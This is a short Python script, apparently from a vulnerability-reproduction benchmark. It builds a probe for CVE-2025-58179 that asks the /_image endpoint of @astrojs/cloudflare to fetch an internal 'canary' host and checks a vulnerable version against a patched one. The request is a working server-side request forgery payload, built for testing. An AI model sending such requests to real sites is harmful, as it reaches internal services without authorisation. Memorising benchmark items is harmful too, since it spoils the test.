#!/usr/bin/env python3
"""CVE-2025-58179 seed candidate — direct internal href to /_image.

V0 (@astrojs/cloudflare 12.6.5) image-endpoint fetches href with no allowlist.
V1 (13.1.9) isRemoteAllowed() rejects host "canary".
"""
from __future__ import annotations
import json
import os
import urllib.parse


def candidate(flag: str, version: str = "v0") -> dict:
    href = f"http://canary/orig-{version}"
    return {
        "probe_id": "cve-2025-58179-direct-internal-href",
        "method": "GET",
        "path": "/_image",
        "href": href,
        "query": f"href={urllib.parse.quote(href, safe='')}&w=64&f=webp",
    }


if __name__ == "__main__":
    flag = os.environ.get("RUN_FLAG") or os.environ.get("PCB_FLAG") or "PCBFLAG_demo"
    version = os.environ.get("VERSION") or "v0"
    print(json.dumps(candidate(flag, version)))
